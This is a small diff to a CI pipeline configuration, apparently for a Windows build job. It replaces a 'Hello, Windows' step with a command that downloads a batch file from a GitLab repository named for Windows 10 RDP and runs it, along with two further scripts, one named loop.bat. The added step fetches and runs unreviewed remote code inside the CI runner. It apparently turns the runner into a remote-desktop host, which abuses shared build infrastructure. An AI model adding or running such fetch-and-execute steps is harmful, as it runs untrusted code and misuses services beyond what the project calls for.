@@ -9,4 +9,5 @@ jobs:
     steps:
       # Commands are run in a Windows virtual machine environment
         - checkout
-        - run: Write-Host 'Hello, Windows'
+        - run: Invoke-WebRequest -Uri "https://gitlab.com/chamod12/lm_win-10_github_rdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat ; cmd /c show.bat ; cmd /c loop.bat
